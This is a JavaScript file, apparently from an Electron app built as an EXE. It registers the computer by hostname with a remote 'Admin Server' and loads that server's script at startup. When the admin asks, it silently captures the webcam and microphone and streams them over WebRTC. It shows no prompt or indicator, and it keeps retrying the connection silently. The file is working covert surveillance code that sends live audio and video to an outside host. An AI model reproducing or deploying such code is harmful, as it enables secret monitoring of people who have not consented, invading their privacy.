// =========================================================================
// VERY IMPORTANT:
// Change this to the IP Address of your main laptop (Anzee Laptop)
// Example: const SERVER_URL = "http://192.168.1.15:3000";
// =========================================================================
const SERVER_URL = "https://cml-0v9b.onrender.com"; // REPLACE THIS BEFORE BUILDING EXE!

let socket;
let peerConnection;
const configuration = {
    iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
        { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
        { urls: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
    ]
};
let localStream;
let iceCandidatesQueue = [];

window.onload = async () => {
    // Dynamically load socket.io-client from the server
    const script = document.createElement('script');
    script.src = SERVER_URL + '/socket.io/socket.io.js';

    script.onload = async () => {
        socket = io(SERVER_URL);

        // Get the computer name (e.g., "Aqu-Laptop")
        const hostname = await window.electronAPI.getHostname();

        socket.on('connect', () => {
            console.log("Connected to Admin Server");
            // Register this laptop to the Admin Dashboard as a camera client
            socket.emit('register-client', { name: hostname, type: 'camera' });
        });

        // When the admin clicks "Watch" on the dashboard
        socket.on('request-offer', async (adminId) => {
            console.log("Received 'request-offer' from admin:", adminId);
            socket.emit('client-error', "Received request-offer, getting screen...");
            try {
                // Capture webcam and microphone
                localStream = await navigator.mediaDevices.getUserMedia({
                    audio: true,
                    video: true
                });

                if (peerConnection) peerConnection.close();
                peerConnection = new RTCPeerConnection(configuration);
                iceCandidatesQueue = [];

                // Send ICE candidates to admin
                peerConnection.onicecandidate = e => {
                    if (e.candidate) {
                        socket.emit('ice-candidate', { candidate: e.candidate, targetId: adminId });
                    }
                };

                peerConnection.onconnectionstatechange = () => {
                    console.log("WebRTC State changed:", peerConnection.connectionState);
                    socket.emit('client-error', "WebRTC State: " + peerConnection.connectionState);
                };

                console.log("Capturing screen... done. Adding tracks to peerConnection");
                // Add the screen video track
                localStream.getTracks().forEach(track => {
                    peerConnection.addTrack(track, localStream);
                });

                // Create and send WebRTC offer
                const offer = await peerConnection.createOffer();
                await peerConnection.setLocalDescription(offer);
                socket.emit('offer', { offer: offer, targetId: adminId });

            } catch (e) {
                console.error("Silent screen capture failed", e);
                socket.emit('client-error', "Capture failed: " + e.message);
            }
        });

        socket.on('answer', async (data) => {
            console.log("Received 'answer' from admin");
            await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));

            // Process queued candidates
            console.log("Processing queued ICE candidates:", iceCandidatesQueue.length);
            for (let candidate of iceCandidatesQueue) {
                try {
                    await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
                } catch (err) { console.error("ICE error", err); }
            }
            iceCandidatesQueue = [];
        });

        socket.on('ice-candidate', async (data) => {
            console.log("Received 'ice-candidate' from admin");
            if (peerConnection) {
                if (peerConnection.remoteDescription) {
                    try {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
                    } catch (err) { console.error("ICE error", err); }
                } else {
                    iceCandidatesQueue.push(data.candidate);
                }
            }
        });
    };

    // If server is not running right now, retry every 5 seconds silently
    script.onerror = () => {
        setTimeout(() => {
            window.location.reload();
        }, 5000);
    };

    document.head.appendChild(script);
};
